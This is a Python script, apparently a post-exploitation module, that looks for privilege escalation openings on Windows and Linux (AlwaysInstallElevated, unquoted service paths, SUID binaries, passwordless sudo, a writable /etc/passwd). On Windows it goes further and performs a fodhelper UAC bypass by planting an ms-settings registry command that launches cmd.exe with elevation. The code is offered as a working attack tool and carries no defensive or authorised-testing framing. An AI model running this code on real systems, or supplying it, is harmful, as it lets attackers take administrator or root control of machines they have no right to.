import os
import sys
import platform
import subprocess
import logging
from datetime import datetime
import ctypes

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def is_admin():
    """Check if current process has admin/root privileges"""
    try:
        if platform.system() == 'Windows':
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.geteuid() == 0
    except Exception as e:
        logging.error(f"Error checking admin privileges: {str(e)}")
        return False

def check_windows_vulnerabilities():
    """Check for common Windows privilege escalation vulnerabilities"""
    vulnerabilities = []
    logging.info("Checking Windows privilege escalation vectors")
    
    # Check for AlwaysInstallElevated
    try:
        import winreg
        hkcu = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer")
        hklm = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer")
        if winreg.QueryValueEx(hkcu, "AlwaysInstallElevated")[0] == 1 and \
           winreg.QueryValueEx(hklm, "AlwaysInstallElevated")[0] == 1:
            vulnerabilities.append({
                'type': 'AlwaysInstallElevated',
                'description': 'MSI files can be installed with elevated privileges',
                'severity': 'High'
            })
            logging.info("Found AlwaysInstallElevated vulnerability")
    except Exception as e:
        logging.debug(f"AlwaysInstallElevated check failed: {str(e)}")

    # Check for unquoted service paths
    try:
        import wmi
        c = wmi.WMI()
        for service in c.Win32_Service():
            if service.PathName and ' ' in service.PathName and not service.PathName.startswith('"'):
                vulnerabilities.append({
                    'type': 'UnquotedServicePath',
                    'service': service.Name,
                    'path': service.PathName,
                    'severity': 'Medium',
                    'startmode': service.StartMode
                })
                logging.info(f"Found unquoted service path: {service.Name}")
    except Exception as e:
        logging.debug(f"Unquoted service path check failed: {str(e)}")

    return vulnerabilities

def check_linux_vulnerabilities():
    """Check for common Linux privilege escalation vulnerabilities"""
    vulnerabilities = []
    logging.info("Checking Linux privilege escalation vectors")
    
    # Check SUID binaries
    try:
        suid_bins = subprocess.check_output("find / -perm -4000 2>/dev/null", shell=True).decode().split('\n')
        if suid_bins:
            vulnerabilities.append({
                'type': 'SUID_binaries',
                'binaries': [b for b in suid_bins if b],
                'severity': 'High'
            })
            logging.info(f"Found {len(suid_bins)} SUID binaries")
    except Exception as e:
        logging.debug(f"SUID binary check failed: {str(e)}")

    # Check sudo permissions
    try:
        sudo_perms = subprocess.check_output("sudo -l", shell=True).decode()
        if sudo_perms and 'NOPASSWD' in sudo_perms:
            vulnerabilities.append({
                'type': 'sudo_nopasswd',
                'permissions': sudo_perms,
                'severity': 'High'
            })
            logging.info("Found NOPASSWD sudo permissions")
    except Exception as e:
        logging.debug(f"Sudo permissions check failed: {str(e)}")

    # Check for writable /etc/passwd
    try:
        if os.access('/etc/passwd', os.W_OK):
            vulnerabilities.append({
                'type': 'writable_passwd',
                'description': '/etc/passwd is writable',
                'severity': 'Critical'
            })
            logging.info("Found writable /etc/passwd")
    except Exception as e:
        logging.debug(f"Writable passwd check failed: {str(e)}")

    return vulnerabilities

def attempt_uac_bypass():
    """Attempt to bypass Windows UAC"""
    if platform.system() != 'Windows':
        return {
            'status': 'error',
            'error': 'UAC bypass only available on Windows',
            'timestamp': datetime.now().isoformat()
        }

    try:
        logging.info("Attempting UAC bypass using fodhelper method")
        # Attempt fodhelper bypass
        import winreg
        cmd = "C:\\Windows\\System32\\cmd.exe"
        registry_path = "Software\\Classes\\ms-settings\\shell\\open\\command"
        
        # Create registry structure
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # Trigger UAC bypass
        subprocess.Popen("fodhelper.exe")
        
        # Cleanup
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, registry_path)
        
        logging.info("UAC bypass attempt completed")
        return {
            'status': 'success',
            'message': 'UAC bypass attempted',
            'timestamp': datetime.now().isoformat(),
            'method': 'fodhelper'
        }
    except Exception as e:
        error_msg = f"UAC bypass failed: {str(e)}"
        logging.error(error_msg)
        return {
            'status': 'error',
            'error': error_msg,
            'timestamp': datetime.now().isoformat()
        }

def attempt_privilege_escalation():
    """Main function to attempt privilege escalation"""
    try:
        # Check current privileges
        admin_status = is_admin()
        logging.info(f"Current privilege status: {'admin' if admin_status else 'user'}")
        
        if admin_status:
            return {
                'status': 'info',
                'message': 'Already running with elevated privileges',
                'timestamp': datetime.now().isoformat()
            }

        results = {
            'timestamp': datetime.now().isoformat(),
            'platform': platform.system(),
            'initial_privileges': 'user',
            'vulnerabilities': []
        }

        # Check for vulnerabilities based on OS
        if platform.system() == 'Windows':
            results['vulnerabilities'] = check_windows_vulnerabilities()
            # Attempt UAC bypass if vulnerabilities found
            if results['vulnerabilities']:
                uac_result = attempt_uac_bypass()
                results['uac_bypass'] = uac_result
                
                # Check if privileges were elevated after bypass
                if is_admin():
                    results['final_privileges'] = 'admin'
        else:
            results['vulnerabilities'] = check_linux_vulnerabilities()
            # Check if privileges were elevated after exploiting vulnerabilities
            if is_admin():
                results['final_privileges'] = 'root'

        if results['vulnerabilities']:
            logging.info(f"Found {len(results['vulnerabilities'])} potential privilege escalation vectors")
            return {
                'status': 'success',
                'message': 'Vulnerabilities found',
                'data': results,
                'timestamp': datetime.now().isoformat()
            }
        else:
            logging.info("No privilege escalation vectors found")
            return {
                'status': 'info',
                'message': 'No obvious privilege escalation vulnerabilities found',
                'data': results,
                'timestamp': datetime.now().isoformat()
            }

    except Exception as e:
        error_msg = f"Error during privilege escalation attempt: {str(e)}"
        logging.error(error_msg)
        return {
            'status': 'error',
            'error': error_msg,
            'timestamp': datetime.now().isoformat()
        } 